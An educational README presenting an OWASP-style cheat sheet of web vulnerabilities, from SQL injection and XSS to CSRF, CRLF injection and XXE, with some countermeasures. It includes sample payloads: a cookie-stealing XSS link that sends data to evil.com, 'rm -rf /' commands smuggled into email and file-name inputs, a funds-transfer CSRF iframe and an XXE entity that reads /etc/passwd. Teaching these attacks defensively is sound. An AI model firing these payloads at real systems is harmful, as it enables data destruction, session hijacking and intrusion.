[![Wisdomic Panda](https://github.com/robagwe/wisdomic-panda/blob/master/imgs/panda.png)](http://www.rohanbagwe.com/)  **Wisdomic Panda**
> *Hold the Vision, Trust the Process.*

# OWASP WebApp Security and Vulnerabilities.
*... Secured Service, Happy Users! Web applications account for 80% of website vulnerabilities, making them a very attractive target to cybercriminals...*
###### Knowledge Sharing, Open Friday, Aug 2016.

<img src="https://github.com/robagwe/wisdomic-panda/blob/master/imgs/websec.gif" width=750>

### :shipit: Want to keep your Web application from getting hacked? Here's how to get serious about secure apps. So let's get serious!

*OWASP or Open Web Application Security Project is a non-profit charitable organization focused on improving the security of software and web applications.
The web security vulnerabilities are prioritized depending on exploitability, detectability and impact on software.*

> •	Exploitability –

What is needed to exploit the security vulnerability? Highest exploitability when the attack needs only web browser and lowest being advanced programming and tools.

> •	Detectability –

How easy is it to detect the threat? Highest being the information displayed on URL, Form or Error message and lowest being source code.

> •	Impact or Damage –

How much damage will be done if the security vulnerability is exposed or attacked? Highest being complete system crash and lowest being nothing at all.

# OWASP cheat sheet

## INJECTIONS

Injection attacks occur when the user is able to input untrusted data tricking the application/system to execute unintended commands.
Wherever a user input is required or use can modify data. It can be a text box, username/password field, feedback fields, comment field, URL etc.

**Examples:**
**HTML injection, SQL Injections, PHP Injections, LDAP Injections and OS injections.**


> • HTML Injection –

![HTML Injection](https://github.com/robagwe/wisdomic-panda/blob/master/imgs/html.gif)


*This ensures that the user’s input has not been validated and just assumes to be trusted and processed.*

> • SQL Injection –

SQL Injection is a security vulnerability that allows an attacker to alter backend SQL statements by manipulating the user supplied data.

Imagine a developer needs to show the account numbers and balances for the current user’s id as provided in a URL. Under normal operation, the user with ID 984 might be logged in, and visit the URL:

> https://bankingwebsite/show_balances?user_id=984211

This means that accountBalanceQuery would end up being:

    SELECT accountNumber, balance FROM accounts WHERE account_owner_id = 984211

**The attacker could change the parameter “user_id” to be interpreted as: 0 OR 1=1**

> https://bankingwebsite/show_balances?user_id=0 OR 1=1

When this query is passed to the database, it will return all the account numbers and balances it has stored, and rows are added to the page to show them. The attacker now knows every user’s account numbers and balances.


**Countermeasure:**

In java above can be restriceted using PreparedStatement.
If an attacker attempts to supply a value that’s not a simple integer, then **statement.setInt()** will throw a SQLException error rather than permitting the query to complete.

    String accountBalanceQuery = 
    "SELECT accountNumber, balance FROM accounts WHERE account_owner_id = ?";
 
 
    PreparedStatement statement = connection.prepareStatement(accountBalanceQuery);
    
    statement.setInt(1, request.getParameter("user_id")); 


*The parameter's value is sanitized by the PreparedStatement.*

If an attacker just knows the valid username and if the query is written 

    String userLoginQuery = "SELECT user_id, username, password_hash FROM users WHERE username = '"
     + request.getParameter("user") + "'" +”and password = ‘” ++ request.getParameter("pass") + "'";
  
    
    select * from Users where username = “rdbagwe” and password = “rdbagwe123”

Now attacker inserts username as **rdbagwe’ –**

*The password is bypassed and the query becomes:*

    select * from users where username = ‘ rdbagwe ‘ -- ‘ and password = ’pass123’ 
**Here -- is comment in SQL**


> • OS Injection –

CGI or Common Gateway Interface Early but by now old-fashioned way for web server to interact with command line executables.

A CGI bash script might contain

> cat thefile | mail clientaddress

Mail  “thefile” to a user-supplied email address.

**Security worries?**
An attacker might enter the email address as:

> rdbagwe@gmail.com; rm –fr /

**What happens then?**

> cat thefile | mail rdbagwe@gmail.com; rm –fr /

Given a request referring to such a cgi executable, eg 

> http://bla.com/cgi-bin/my_script? clientaddress=rdbagwe@gmail.com; rm –fr /

*the web server executes it, and this wipes out the entire file system if the application were running with root privileges on a linux/unix system.*


## BROKEN AUTHENTICATION

Broken authentication occurs when the application mismanages session related information such that the user’s identity gets compromised. The information can be in the form of session cookies, passwords, secret keys etc.
The aim here is to either get into someone else’s session or use a session which has been ended by the user or steal session related information. Let’s check a few scenarios. 

**Examples:**

1.	Press the back button after logout to see if you can get into the previous session.
2.	Try to hit the URL directly after logging out to check if you are able to access that page.
3.	Check for the presence of session-related information in the URLs. Try manipulating them to check if you are able to ride someone else’s session.
4.	Try finding the credentials in the source code. Right click on the page and hit view source. Sometimes coders hardcode the credentials for easy access which sometimes remain there unidentified.


## Insecure Direct Object References

It occurs when a developer exposes a reference to an internal implementation object, 
The attacker can use this information to access other objects and can create a future attack to access the unauthorized data.

> Implication: Using this vulnerability, an attacker can gain access to unauthorized internal objects, 

**Examples:**

Changing "userid" in the following URL can make an attacker to view other user's information.

> http://www.vulnerablesite.com/userid=123 

**Modified to**

> http://www.vulnerablesite.com/userid=124

*An attacker can view others information by changing user id value.*

## XSS or CROSS SITE SCRIPTING

The exploitation of a XSS flaw enables the attacker to inject client-side scripts into web pages viewed by users.
Due to the ability to execute JavaScript under the site’s domain, the attackers are able to:
Read all cookies (that are not protected by HttpOnly), including session cookies. By doing so, an attacker could take over the session.

**Example:**

 > PHP API for search

Assume a site does has a search box with code as the following:

    <?php
     // Code for performing the actual search
     } else {
    echo "Could not find any pages when searching for " .$_GET['query'];
     }
     ?>

> https://example.com/search.php?query=test

This would output the user input straight to the HTML-document. As such, if a user would give HTML as input the browser would be required to render that.

**Example:** 

If user enters in the search box <script>alert(1)</script>

> https://example.com/search.php?query=<script>alert(1)</script>

It would result in the following that the browser would try to render.

Could not find any pages when searching for <script>alert(1)</script>

That is perfectly valid HTML! **and the script will get executed.**

**To show the danger of this, imagine an attacker getting the user to click a link as the following:**

    https://example.com/search.php?query=<script>document.InnerHTML += "<img src='http://evil.com?cookie="+document.cookie+"'>"</script>

**It would result in this, which sends the cookies to the attacker. If there for example were sessions id, an attacker could hijack the session.**


## CROSS-SITE REQUEST FORGERY

A malicious website will send a request to a web application that a user is already authenticated against from a different website. This way an attacker can access functionality in a target web application via the victim's already authenticated browser.

let’s say examplebank.com has online banking that is vulnerable to CSRF. If I visit a page containing a CSRF attack on examplebank.com but am not currently logged in, nothing happens. If I am logged in, however, the requests in the attack will be executed as if they were actions that I had intended to take.

Now let’s say I happen to visit somemalicioussite.com. It just so happens that this site is trying to attack people who bank with examplebank.com and has set up a CSRF attack on its site. The attack will transfer $1,500.00 to account number 123456789. Somewhere on somemalicioussite.com, attackers have added this line of code:

    <iframe src="//www.veracode.com/%3Ca%20href%3D"http://examplebank.com/app/transferFunds?amount=1500&destinationAccount=123456789">http://examplebank.com/app/transferFunds?amount=1500&destinationAccount=..." >

**Upon loading that iframe, my browser will send that request to examplebank.com, which my browser has already logged in as me. The request will be processed and send $1,500.00 to account 123456789.**

## FAILURE TO RESTRICT URL ACCESS

Attacker notices the URL indicates the role as:

> "/user/getaccounts." 

He modifies as 

> "/admin/getaccounts".

An attacker can append role to the URL.
> http://www.vulnerablsite.com can be modified as http://www.vulnerablesite.com/admin

Web applications check URL access rights before rendering protected links and buttons. Applications need to perform similar access control checks each time these pages are accessed.

Access to most of the links are restricted using css at client side, which is a very poor practice.
Simply inspecting the element and editing the css (by  removing the hidden property , a particular link can be visible and still accessible)
 
## UNVALIDATED REDIRECTS and FORWARDS

If there is no proper validation while redirecting to other pages, attackers can make use of this and can redirect victims to phishing or malware sites, or use forwards to access unauthorized pages.

> Implication -

An attacker can send a URL to the user that contains a genuine URL appended with encoded malicious URL. A user by just seeing the genuine part of the attacker sent URL can browse it and may become a victim.

**Examples:**

> http://www.vulnerablesite.com/login.aspx?redirectURL=ownsite.com

Modified to

> http://www.vulnerablesite.com/login.aspx?redirectURL=evilsite.com

## INSECURE DESERIALIZATION

Some of the applications save data on the client side and they may be using object serialization. Applications which rely on the client to maintain state may allow tampering of serialized data. This is a new entry in the list and is difficult to exploit. 

**Example:**

Altering the serialized objects in the cookies for privilege escalation.

    X: x :{ z: z:”NAME”: r:”USER”} -->> Normal cookie
    X: x :{ z: z:”NAME”: r:”ADMIN”} -->> Altered cookie object
    
*Also, In pyhon we can serialise or deserialise objects using pickel library. If we get access to such pickeled objects then object tampering is possible*

## CRLF INJECTION

CRLF refers to the special character elements "Carriage Return" and "Line Feed." These elements are embedded in HTTP headers and other software code to signify an End of Line (EOL) marker.

Let's examine how CRLF injections cause damage by looking at one of the most basic example of a CRLF attack: adding fake entries into log files. Suppose a vulnerable application accepts unsanitized or improperly neutralized data and writes it to a system log file. An attacker supplies the following input:


> Hello, World<CR><LF>DATABASE ERROR: TABLE CORRUPTION

Because this error is fake, a sysadmin may waste a lot of time troubleshooting a non-existent error. An attacker could use this type of Trojan to distract the admin while attacking the system somewhere else.

Another way to illustrate how CRLF injections can cause severe harm is through an application that accepts a file name as user input and then executes a relatively harmless command on that file, such as "ls –a ." If the application is vulnerable to CRLF injection because of improperly neutralized or unsanitized data input, an attacker could provide the following input:


> filename<CR><LF>/bin/rm -rf / 

*This CRLF injection attack could wipe out the entire file system if the application were running with root privileges on a linux/unix system.*


## BUFFER OVERFLOW: Code-side Vulnerabilities

    Fun{
    char buffer[5]
    }

Here char is 1 byte. 
So if we request buffer with 5 bytes, we must spend two double words ie 8byte

But the problem with these functions is that it is the programmer responsibility to assert the size of the buffer, not the compiler.
So till the size of the input is less than 8byte no issue. But buffer overflow occurs when you input more than 8 bytes; the buffer will be over flowed.

    Input: 12345678 (8 bytes), the program run smoothly.

    Input: 123456789 (9 bytes)
    "Segmentation fault" message will be displayed and the program terminates.

In this example, since buffer is the only variable declared, the next values on the stack would be the location in memory to which the program will return after running the Fun. 

This means that if the user enters more than 8bytes of data (enough to overflow the memory specifically set aside for the buffer), then, the program’s return address will be modified. 

**This allows the user to force the program to exit the function at a different point in the code than originally intended, potentially causing the program to behave in dangerous and unintended ways.**

Every C/C++ coder or programmer must know the buffer overflow problem before they do the coding


## SENSITIVE DATA EXPOSURE

Weak crypto algorithms are susceptible to attacks and give out sensitive data. In the below example the username and password are sent using base64 encoding.

The request can be easily intercepted and decoded. The attacker can also launch SQL attacks by gaining such knowledge. Check the password in the below intercepted and decoded request. **You can use BurpSuite for interception and decoding.**

## XML EXTERNAL ENTITIES (XXE)

An application is vulnerable to XXE attacks if it enabled users to upload a malicious XML which further exploits the vulnerable code and/or dependencies.


For someone who is not aware of XML, you can think of it as something that is used to describe data. Thus, two systems which are running on different technologies can communicate and exchange data with one another using XML.

Now these XML documents can contain something called ‘entities’ defined using a system identifier and are present within a DOCTYPE header. These entities can access local or remote content.

     <DOCTYPE robagwe[
        <ENTITY entityex SYSTEM "file:////etc/passwd">
     ]>
     <abc>entityex;<abc>
     
In the above code, the external entity ‘entityex’ is declared with the value file:///etc/passwd. During XML parsing, this entity will be replaced with the respective value. The use of keyword ‘SYSTEM’ instructs the parser that the entity value should be read from the URI that follows. Thus, when the entity value is used many times, this would seem very helpful.

**What is an XXE attack?**

With XML entities, the ‘SYSTEM’ keyword causes an XML parser to read data from a URI and permits it to be substituted in the document. Thus, an attacker can send his own values through the entity and make the application display it. In simple words, an attacker forces the XML parser to access the resource specified by him which could be a file on the system or on any remote system.


> **A web application firewall (WAF) is an advanced layer of protection for your website that provides protection against the OWASP Top 10 web application flaws. A WAF evaluates website traffic and determines who is and is not allowed to access a site. It looks at the traffic’s location, behavior and the information it is requesting. From there, it determines whether the traffic is safe or malicious.**


### :construction: [Source](https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series#tab=Master_Cheat_Sheet) to ensure you’re covered.

## <img src="https://github.com/robagwe/wisdomic-panda/blob/master/imgs/acr.png" width="50"> All things considered,</img>

### Security is all about identifying and mitigating possible risks of attack. The operative word here is mitigation, since new threats are always emerging. This is an ongoing exercise. Be sure to conduct regular reviews of all existing measures, check for new defence mechanisms and keep abreast of security announcements.

> *कर्मण्येवाधिकारस्ते मा फलेषु कदाचन।*

> *मा कर्मफलहेतुर्भूर्मा ते सङ्गोऽस्त्वकर्मणि॥ - श्रीमद्‍भगवद्‍गीता*

> *"Do your duty without thinking about results" - Krishna*
